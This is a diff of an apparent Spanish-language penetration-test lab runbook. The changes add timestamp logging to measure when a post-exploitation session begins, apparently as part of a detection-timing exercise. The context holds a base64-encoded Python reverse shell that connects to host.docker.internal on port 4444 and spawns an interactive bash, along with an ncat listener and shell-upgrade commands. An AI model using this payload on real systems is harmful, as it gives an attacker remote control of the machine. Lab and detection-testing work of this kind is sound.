@@ -6,13 +6,20 @@ echo "$B64"
 
 Out: aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldCgpO3MuY29ubmVjdCgoImhvc3QuZG9ja2VyLmludGVybmFsIiw0NDQ0KSk7b3MuZHVwMihzLmZpbGVubygpLDApO29zLmR1cDIocy5maWxlbm8oKSwxKTtvcy5kdXAyKHMuZmlsZW5vKCksMik7c3VicHJvY2Vzcy5jYWxsKFsiL2Jpbi9iYXNoIiwiLWkiXSk=
 
-# Reverse shell:
+# Reverse shell (Escenario A o B — misma cadena; B usa logcapture_zerotrust.sh):
 ncat -lvnp 4444
+# Anotar en papel/notas la hora exacta de "Connection received" → respaldo de T0_efectivo
+
 python3 -c 'import pty; pty.spawn("/bin/bash")'
 export TERM=xterm-256color
 export TZ=Europe/Madrid
 export PS1='[\D{%H:%M:%S}] root@webapp:\w\$ '
 stty rows 40 cols 120
+
+# T0_efectivo (inmediatamente tras PS1 — antes de cualquier hito post-RCE):
+echo "T0_efectivo=$(date '+%Y-%m-%d %H:%M:%S %Z')" | tee /tmp/t0_efectivo.txt
+echo "T0_efectivo PS1=$(date '+%H:%M:%S')" | tee /tmp/session_chrono.txt
+# Continuar con tests/POST-RCE comandos y notas.txt
 
 
 # Ejecutar RCE:
